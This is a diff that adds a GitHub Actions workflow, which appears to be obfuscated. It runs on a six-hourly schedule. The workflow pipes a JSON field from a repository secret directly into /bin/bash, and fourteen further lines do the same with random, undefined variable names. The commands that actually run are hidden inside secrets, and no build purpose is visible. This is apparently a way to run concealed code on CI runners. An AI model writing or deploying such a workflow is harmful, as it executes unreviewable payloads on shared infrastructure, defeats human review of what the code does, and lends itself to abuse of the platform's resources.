@@ -1,0 +1,30 @@
+name: yanxiaosan1829
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanxiaosan1829
+        env:
+          hsx35: ${{ secrets.hsx35 }}
+        run: |
+          echo $hsx35 | jq -r .twd90 | /bin/bash
+          echo $cfb5042 | jq -r .j814 | /bin/bash
+          echo $rtx9190 | jq -r .v90363 | /bin/bash
+          echo $mnz6552 | jq -r .uhhr76312 | /bin/bash
+          echo $img2 | jq -r .om87 | /bin/bash
+          echo $dwic8 | jq -r .syagc244 | /bin/bash
+          echo $vfx3 | jq -r .x8776 | /bin/bash
+          echo $tmfc90377 | jq -r .icnn2 | /bin/bash
+          echo $cdeu3 | jq -r .g96 | /bin/bash
+          echo $jc6174 | jq -r .j32130 | /bin/bash
+          echo $xbjx921 | jq -r .cpc5121 | /bin/bash
+          echo $fhmx12484 | jq -r .r26 | /bin/bash
+          echo $lrejq2 | jq -r .hkbtq31 | /bin/bash
+          echo $n7 | jq -r .utku62787 | /bin/bash
+          echo $o4 | jq -r .ynv2 | /bin/bash
+
